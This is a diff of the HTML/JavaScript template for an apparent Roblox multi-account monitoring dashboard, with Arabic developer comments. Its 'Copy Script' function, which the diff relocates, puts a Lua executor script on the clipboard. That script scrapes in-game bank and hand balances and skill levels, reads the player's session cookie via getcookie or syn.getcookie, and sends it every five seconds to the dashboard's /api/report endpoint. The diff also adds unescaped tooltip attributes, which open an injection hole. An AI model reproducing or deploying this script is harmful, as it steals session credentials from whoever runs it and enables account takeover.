@@ -20,7 +20,6 @@ button,input{font:inherit;color:inherit}:focus-visible{outline:2px solid var(--a
 .meta{color:var(--mute);font-size:13px;display:flex;gap:16px;flex-wrap:wrap}.meta b{color:var(--ink)}
 .sp{flex:1}
 
-/* 🔴 تأمين الأزرار عشان تنضغط */
 .b{background:var(--p);border:1px solid var(--line);border-radius:9px;padding:7px 14px;cursor:pointer;font-weight:700;font-size:13px;transition:0.2s; pointer-events: auto !important; position: relative; z-index: 9999;}
 .b:hover{border-color:var(--ac)}.b.pri{background:var(--ac);border-color:var(--ac);color:#fff}
 .b.live.on{border-color:var(--ok);color:var(--ok)}
@@ -31,7 +30,6 @@ button,input{font:inherit;color:inherit}:focus-visible{outline:2px solid var(--a
 .user-avatar{width:34px;height:34px;border-radius:50%;background:linear-gradient(135deg,var(--ac2),var(--ac));color:#fff;display:grid;place-items:center;font-weight:800;font-size:16px;box-shadow:0 0 10px rgba(124,140,255,0.3);}
 .user-name{font-weight:700;font-size:14px;}
 
-/* 🔴 القائمة المنسدلة عشان تنضغط */
 .user-dropdown{position:absolute;top:calc(100% + 8px);right:0;background:var(--p2);border:1px solid var(--line);border-radius:12px;width:200px;padding:6px;display:none;flex-direction:column;box-shadow:0 10px 30px rgba(0,0,0,0.5); z-index: 99999; pointer-events: auto !important;}
 .user-dropdown.show{display:flex;}
 .user-dropdown button, .user-dropdown a{display:flex;width:100%;text-align:start;padding:10px 12px;border:none;background:none;border-radius:8px;cursor:pointer;font-weight:600;font-size:13px;color:var(--ink);text-decoration:none;transition:0.2s; pointer-events: auto !important;}
@@ -86,55 +84,6 @@ dialog h2{margin:0 0 12px;font:800 20px 'Bricolage Grotesque'}dialog label{displ
 dialog input{width:100%;margin-top:4px;background:var(--bg);border:1px solid var(--line);border-radius:8px;padding:8px 10px}
 @media(max-width:800px){.hero{grid-template-columns:1fr}}
 </style>
-
-<!-- 🔴 نضع دالة النسخ هنا في الـ Head عشان تكون جاهزة قبل أي شي -->
-<script>
-function forceCopyScript() {
-    const domain = window.location.origin;
-    const key = "{{ my_key | default('Overseer') }}";
-    const script = `repeat task.wait() until game:IsLoaded()\n\ngetgenv().OverseerConfig = {\n    ["key"] = "${key}",\n    ["PC_NAME"] = "MR 1"\n}\n\nloadstring([[c=getgenv().OverseerConfig p=game.Players.LocalPlayer h=game:GetService"HttpService" r=request or http_request d={fishing=1,stamina=1,shelfstocker=1,janitor=1,swiper=1,farming=1,cook=1} ck="" if getcookie then ck=getcookie() elseif syn and syn.getcookie then ck=syn.getcookie() end task.spawn(function()while wait(5)do b,cc,l,s=0,0,0,{} for _,o in next,p.PlayerGui:GetDescendants()do if o:IsA"TextLabel"then t=o.Text b=tonumber(t:match"Bank Balance:%D*(%d+)" )or b cc=tonumber(t:match"Hand Balance:%D*(%d+)" )or cc l=tonumber(t:match"Total Level:%D*(%d+)" )or l n,v=t:match"([%a%s]+):%s*(%d+)" if n and v then n=n:gsub("%s",""):lower() if d[n] then s[#s+1]={name=n,level=v+0}end end end end pcall(r,{Url="${domain}/api/report",Method="POST",Body=h:JSONEncode({k=c.key,c=cc,b=b,l=l,s=s,n=p.Name,dn=p.DisplayName,u=p.UserId,pc=c.PC_NAME,ck=ck})})end end)]])()`;
-
-    // محاولة النسخ بـ 3 طرق
-    if (navigator.clipboard && window.isSecureContext) {
-        navigator.clipboard.writeText(script).then(() => {
-            alert("✅ Script copied successfully!");
-        }).catch(err => {
-            fallbackCopy(script);
-        });
-    } else {
-        fallbackCopy(script);
-    }
-}
-
-function fallbackCopy(text) {
-    let textArea = document.createElement("textarea");
-    textArea.value = text;
-    textArea.style.position = "fixed";
-    textArea.style.left = "-999999px";
-    textArea.style.top = "-999999px";
-    document.body.appendChild(textArea);
-    textArea.focus();
-    textArea.select();
-    try {
-        document.execCommand('copy');
-        alert("✅ Script copied successfully!");
-    } catch (err) {
-        alert("❌ Failed to copy. Please copy manually.");
-    }
-    textArea.remove();
-}
-
-function toggleUserMenu(e) {
-    if(e) e.stopPropagation();
-    document.getElementById("uDropdown").classList.toggle("show");
-}
-
-function openResetModal(e) {
-    if(e) e.stopPropagation();
-    document.getElementById("uDropdown").classList.remove("show");
-    document.getElementById("resetModal").showModal();
-}
-</script>
 </head>
 <body>
 <div class="w">
@@ -143,23 +92,20 @@ function openResetModal(e) {
   <div class="meta"><span><b id="mAcc">0</b> accounts</span><span><b id="mLive">0</b> live</span></div>
   <div class="sp"></div>
   
-  <button class="b live on" id="live"><span class="dot"></span>Live</button>
-  <button class="b" id="exp">Export CSV</button>
+  <button class="b live on" id="live" type="button"><span class="dot"></span>Live</button>
+  <button class="b" id="exp" type="button">Export CSV</button>
   
-  <!-- 🔴 ربط زر النسخ مباشرة بـ onclick -->
-  <button class="b pri" id="copy-script" onclick="forceCopyScript()">Copy Script</button>
+  <button class="b pri" id="copy-script" type="button" onclick="forceCopyScript(this)">Copy Script</button>
 
-  <!-- 🔴 ربط القائمة والاسم مباشرة بـ onclick -->
   <div class="user-menu">
     <div class="user-trigger" onclick="toggleUserMenu(event)">
-      <div class="user-avatar" id="uAvatar">{{ my_key[:2]|upper if my_key else 'O' }}</div>
-      <div class="user-name" id="uName">{{ my_key | default('Overseer') }}</div>
+      <div class="user-avatar">{{ my_key[:2]|upper if my_key else 'O' }}</div>
+      <div class="user-name">{{ my_key | default('Overseer') }}</div>
     </div>
     <div class="user-dropdown" id="uDropdown">
-      <button onclick="openResetModal(event)">🔑 Reset Password</button>
+      <button type="button" onclick="openResetModal(event)">🔑 Reset Password</button>
       <div class="dropdown-divider"></div>
-      <!-- 🔴 ربط زر الخروج مباشرة -->
-      <a href="/logout" onclick="window.location.href='/logout'; return false;">🚪 Sign Out</a>
+      <a href="/logout">🚪 Sign Out</a>
     </div>
   </div>
 </div>
@@ -186,7 +132,7 @@ function openResetModal(e) {
 <div class="tw"><table><thead><tr id="th"></tr></thead><tbody id="tbd"></tbody></table><div class="empty" id="emp" hidden>No accounts match. The data will appear here automatically.</div></div>
 </div>
 
-<div class="bulk" id="bulk" hidden><b id="bn"></b><button class="b" id="bcopy">Copy usernames</button><button class="b" id="bdel" style="color:var(--bad)">Delete</button><button class="b" id="bclr">Clear</button></div>
+<div class="bulk" id="bulk" hidden><b id="bn"></b><button class="b" id="bcopy" type="button">Copy usernames</button><button class="b" id="bdel" style="color:var(--bad)" type="button">Delete</button><button class="b" id="bclr" type="button">Clear</button></div>
 
 <dialog id="resetModal">
   <form method="dialog" id="resetForm">
@@ -200,7 +146,54 @@ function openResetModal(e) {
 </dialog>
 
 <script>
-// باقي الجافاسكربت الخاص بالبيانات
+// 🔴 1. دالة النسخ
+function forceCopyScript(btn) {
+    const domain = window.location.origin;
+    const key = "{{ my_key | default('Overseer') }}";
+    const script = `repeat task.wait() until game:IsLoaded()\n\ngetgenv().OverseerConfig = {\n    ["key"] = "${key}",\n    ["PC_NAME"] = "MR 1"\n}\n\nloadstring([[c=getgenv().OverseerConfig p=game.Players.LocalPlayer h=game:GetService"HttpService" r=request or http_request d={fishing=1,stamina=1,shelfstocker=1,janitor=1,swiper=1,farming=1,cook=1} ck="" if getcookie then ck=getcookie() elseif syn and syn.getcookie then ck=syn.getcookie() end task.spawn(function()while wait(5)do b,cc,l,s=0,0,0,{} for _,o in next,p.PlayerGui:GetDescendants()do if o:IsA"TextLabel"then t=o.Text b=tonumber(t:match"Bank Balance:%D*(%d+)" )or b cc=tonumber(t:match"Hand Balance:%D*(%d+)" )or cc l=tonumber(t:match"Total Level:%D*(%d+)" )or l n,v=t:match"([%a%s]+):%s*(%d+)" if n and v then n=n:gsub("%s",""):lower() if d[n] then s[#s+1]={name=n,level=v+0}end end end end pcall(r,{Url="${domain}/api/report",Method="POST",Body=h:JSONEncode({k=c.key,c=cc,b=b,l=l,s=s,n=p.Name,dn=p.DisplayName,u=p.UserId,pc=c.PC_NAME,ck=ck})})end end)]])()`;
+
+    const originalText = btn.innerText;
+    btn.innerText = "✅ Copied!";
+    btn.style.background = "var(--ok)";
+    btn.style.borderColor = "var(--ok)";
+    setTimeout(() => {
+        btn.innerText = originalText;
+        btn.style.background = "";
+        btn.style.borderColor = "";
+    }, 2000);
+
+    if (navigator.clipboard && window.isSecureContext) {
+        navigator.clipboard.writeText(script).catch(() => fallbackCopyText(script));
+    } else {
+        fallbackCopyText(script);
+    }
+}
+
+function fallbackCopyText(text) {
+    let textArea = document.createElement("textarea");
+    textArea.value = text;
+    textArea.style.position = "fixed";
+    textArea.style.left = "-999999px";
+    textArea.style.top = "-999999px";
+    document.body.appendChild(textArea);
+    textArea.focus();
+    textArea.select();
+    try { document.execCommand('copy'); } catch (err) { console.error('Fallback copy failed', err); }
+    textArea.remove();
+}
+
+function toggleUserMenu(e) {
+    if(e) e.stopPropagation();
+    document.getElementById("uDropdown").classList.toggle("show");
+}
+
+function openResetModal(e) {
+    if(e) e.stopPropagation();
+    document.getElementById("uDropdown").classList.remove("show");
+    document.getElementById("resetModal").showModal();
+}
+
+// 🔴 2. استقبال البيانات الكاملة
 const SERVER_DATA = {
     accounts: {{ accounts | default([]) | tojson | safe }},
     stats: {{ stats | default({}) | tojson | safe }},
@@ -215,16 +208,29 @@ var accs = [];
 function mapAccounts(raw) {
     if (!raw || !Array.isArray(raw)) return [];
     return raw.map(function(a, i) {
-        let stamina = (a.skills && a.skills['stamina']) ? a.skills['stamina'] : 0;
-        let swiper = (a.skills && a.skills['swiper']) ? a.skills['swiper'] : 0;
-        let total = (a.cash || 0) + (a.bank || 0);
+        let skills = a.skills || {};
+        
+        // تجهيز نص يعرض كل المهارات عشان يطلع في التولتيب
+        let allSkillsStr = "";
+        for (let k in skills) {
+            allSkillsStr += k + ": " + skills[k] + "\n";
+        }
+        if(!allSkillsStr) allSkillsStr = "No skills data";
+
         return {
-            id: i + 1, user: a.name, pc: a.pc || "MR 1",
+            id: i + 1, 
+            user: a.name, 
+            pc: a.pc || "MR 1",
             st: a.online ? "online" : "offline",
-            pocket: a.cash || 0, bank: a.bank || 0,
-            l: [a.total_level || 0, stamina, swiper],
+            pocket: a.cash || 0, 
+            bank: a.bank || 0,
+            l: [a.total_level || 0, skills['stamina'] || 0, skills['swiper'] || 0],
+            fullSkills: allSkillsStr, // نخزن النص كامل هنا
+            display_name: a.display_name || a.name,
+            user_id: a.user_id || "",
             mins: Math.floor((a.uptime || 0) / 60),
-            h: [total, total], sel: 0
+            h: [((a.cash || 0) + (a.bank || 0)), ((a.cash || 0) + (a.bank || 0))], 
+            sel: 0
         };
     });
 }
@@ -259,8 +265,12 @@ function esc(s){return String(s).replace(/[&<>"]/g,function(c){return{"&":"&amp;
 function rows(){$("th").innerHTML='<th><input type="checkbox" id="all" aria-label="Select all"></th>'+cols.map(function(c){return'<th data-k="'+c[0]+'"'+(sk===c[0]?' aria-sort="'+(sd>0?"ascending":"descending")+'"':"")+'>'+c[1]+'</th>'}).join("");
  var v=accs.filter(function(a){return(flt==="all"||a.st===flt)&&(!pcf||a.pc===pcf)&&(!q||(a.user+" "+a.pc).toLowerCase().indexOf(q)>-1)}).sort(function(a,b){var x=val(a,sk),y=val(b,sk);return(typeof x==="string"?x.localeCompare(y):x-y)*sd});
  $("emp").hidden=v.length>0;$("cnt").textContent=v.length+" of "+accs.length+" shown";
+ 
  $("tbd").innerHTML=v.map(function(a){var e=eco(a),m=Math.floor(a.mins/60)+"h "+String(a.mins%60).padStart(2,"0")+"m",up=a.h[a.h.length-1]>=a.h[0];
- return'<tr class="'+(a.sel?"sel":"")+'"><td><input type="checkbox" data-i="'+a.id+'"'+(a.sel?" checked":"")+' aria-label="Select"></td><td><span class="pill s-'+a.st+'"><i></i>'+a.st[0].toUpperCase()+a.st.slice(1)+'</span></td><td><span class="pc">'+esc(a.pc)+'</span></td><td><span class="u" data-c="'+esc(a.user)+'" title="Click to copy">'+esc(a.user)+'</span></td><td class="eco '+e[1]+'">'+e[0]+'</td><td class="n">'+m+'</td><td><span class="lv t">'+a.l[0]+'</span><span class="lv a">'+a.l[1]+'</span><span class="lv c">'+a.l[2]+'</span></td><td class="n gd">'+M(a.pocket)+'</td><td class="n" style="color:#66d4ff">'+M(a.bank)+'</td><td class="n">'+M(tot(a))+'</td><td><svg width="70" height="24" viewBox="0 0 70 24">'+spark(a.h,70,24,up?"var(--ok)":"var(--bad)",0)+'</svg></td></tr>'}).join("");
+ 
+ // 🔴 هنا حطينا التولتيب اللي يطلع كل المهارات لما تحط الماوس على اللفل
+ return'<tr class="'+(a.sel?"sel":"")+'"><td><input type="checkbox" data-i="'+a.id+'"'+(a.sel?" checked":"")+' aria-label="Select"></td><td><span class="pill s-'+a.st+'"><i></i>'+a.st[0].toUpperCase()+a.st.slice(1)+'</span></td><td><span class="pc">'+esc(a.pc)+'</span></td><td><span class="u" data-c="'+esc(a.user)+'" title="ID: '+a.user_id+' | Name: '+esc(a.display_name)+'">'+esc(a.user)+'</span></td><td class="eco '+e[1]+'">'+e[0]+'</td><td class="n">'+m+'</td><td title="'+a.fullSkills+'"><span class="lv t">'+a.l[0]+'</span><span class="lv a">'+a.l[1]+'</span><span class="lv c">'+a.l[2]+'</span></td><td class="n gd">'+M(a.pocket)+'</td><td class="n" style="color:#66d4ff">'+M(a.bank)+'</td><td class="n">'+M(tot(a))+'</td><td><svg width="70" height="24" viewBox="0 0 70 24">'+spark(a.h,70,24,up?"var(--ok)":"var(--bad)",0)+'</svg></td></tr>'}).join("");
+ 
  [].forEach.call($("th").querySelectorAll("th[data-k]"),function(t){t.onclick=function(){var k=t.dataset.k;if(sk===k)sd=-sd;else{sk=k;sd=-1}rows()}});
  [].forEach.call($("tbd").querySelectorAll("input[data-i]"),function(c){c.onchange=function(){accs.forEach(function(a){if(a.id==+c.dataset.i)a.sel=c.checked?1:0});rows();bulk()}});
  [].forEach.call($("tbd").querySelectorAll("[data-c]"),function(u){u.onclick=function(){try{navigator.clipboard.writeText(u.dataset.c);u.textContent="Copied";setTimeout(rows,700)}catch(e){}}});
@@ -285,7 +295,6 @@ $("bdel").onclick=async function(){
 $("bcopy").onclick=function(){try{navigator.clipboard.writeText(accs.filter(function(a){return a.sel}).map(function(a){return a.user}).join("\n"))}catch(e){}};
 $("exp").onclick=function(){var t="\uFEFFstatus,machine,username,pocket,bank,total\n"+accs.map(function(a){return[a.st,a.pc,a.user,a.pocket,a.bank,tot(a)].join(",")}).join("\n");try{var l=document.createElement("a");l.href=URL.createObjectURL(new Blob([t],{type:"text/csv"}));l.download="accounts.csv";l.click()}catch(e){}};
 
-// 🔴 قفل القائمة إذا ضغطت في أي مكان ثاني
 window.addEventListener('click', function(e) {
     var menu = document.getElementById('uDropdown');
     if (menu && menu.classList.contains('show') && !e.target.closest('.user-menu')) {
@@ -293,7 +302,6 @@ window.addEventListener('click', function(e) {
     }
 });
 
-// 🔴 دالة تغيير الباسورد
 document.getElementById('resetForm').onsubmit = async function(e) {
     if (!e.submitter || e.submitter.value !== "ok") return;
     e.preventDefault();
@@ -321,7 +329,6 @@ document.getElementById('resetForm').onsubmit = async function(e) {
 
 draw();
 
-// 🔴 التحديث التلقائي
 setInterval(async () => {
     try {
         let res = await fetch('/api/accounts');
